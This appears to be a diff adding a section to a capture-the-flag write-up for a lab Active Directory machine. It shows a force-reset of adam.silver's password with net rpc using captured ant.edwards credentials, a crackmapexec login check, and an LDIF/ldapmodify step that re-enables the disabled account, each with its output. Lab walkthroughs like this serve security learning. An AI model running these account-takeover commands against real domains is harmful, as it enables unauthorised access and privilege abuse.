@@ -297,3 +297,64 @@ Looking again at Bloodhound, we can see that ant.edwards is a member of Senior D
 #### Bloodhound:
 
 <img src="images/03-ant-adam.png" width="500">
+
+There are a few abuse options we have, but I opted for Force Change Password, of the adam.silver user:
+
+#### Force Change Password:
+
+```
+net rpc password "adam.silver" "ChangeMe123!" -U "puppy.htb"/"ant.edwards"%"Antman2025!" -S "10.129.232.75"
+```
+
+#### Check user login:
+
+```
+crackmapexec smb 10.129.232.75 -u adam.silver -p 'ChangeMe123!'
+```
+
+#### Output:
+
+```
+SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\adam.silver:ChangeMe123! STATUS_ACCOUNT_DISABLED 
+```
+
+As we can see above, adam.silver's password has been changed successfully, but the account is disabled.
+
+To bypass this we can use an LDIF file and reactivate the account over LDAP:
+
+#### Create LDIF file:
+
+```bash
+cat > enable.ldif <<'EOF'                                 
+dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
+changetype: modify
+replace: userAccountControl
+userAccountControl: 512
+EOF
+```
+
+#### Use ldapmodify:
+
+```
+ldapmodify -x -H ldap://10.129.232.75   -D 'ant.edwards@puppy.htb' -w 'Antman2025!' -f enable.ldif
+```
+
+#### Output:
+
+```
+modifying entry "CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB"
+```
+
+#### Testing SMB access:
+
+```
+crackmapexec smb 10.129.232.75 -u adam.silver -p 'ChangeMe123!'
+```
+
+#### Output:
+
+```
+SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\adam.silver:ChangeMe123! 
+```
+
+We have now re-enabled adam.silver's account.
